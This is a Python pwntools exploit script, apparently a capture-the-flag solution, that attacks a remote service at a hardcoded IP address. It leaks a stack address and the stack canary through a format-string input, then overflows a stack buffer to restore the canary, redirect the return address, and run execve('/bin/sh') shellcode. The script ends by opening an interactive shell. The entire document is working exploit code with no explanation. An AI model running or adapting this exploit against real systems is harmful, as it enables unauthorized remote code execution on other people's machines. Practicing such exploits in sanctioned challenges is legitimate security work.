from pwn import *


context.arch = 'amd64'

r = remote('34.76.206.46',10003)

#r = process("./chall")

#gdb.attach(r, '''
#set follow-fork-mode child
#''')

r.send(b"%7$p%77$p")
r.recvuntil(b"You entered: ")
addresses = r.recvline().replace(b'\n',b'').split(b'0x')[1:]
print(addresses)
addresses[1] = b'0x' + addresses[1]
print(addresses[1])
stack_canary = int(addresses[1],16)
addr2 = int(addresses[0],16)



shellcode_loc = addr2 + 528 + 8 + 8
buf_loc = addr2 + 0x230
print(addr2)
print("Stack canary:",hex(stack_canary))
print("Stack address leak:",hex(addr2))
import time
time.sleep(1)
r.sendline(b"yes")


shellcode ="nop;"*64 + """
    lea rdi, [rip+binsh]

    xor rsi, rsi;
    xor rdx, rdx;
    mov rax, 0x3b;
    syscall;

    binsh:
    .string "/bin/sh"
""".format(hex(buf_loc))

print("Assembling execve shellcode")
craft = asm(shellcode)

print(craft)
print(len(b"/bin/sh\x00"))
r.sendline(b"\x00"*520+p64(stack_canary)+p64(addr2)+p64(shellcode_loc) + craft)

r.interactive()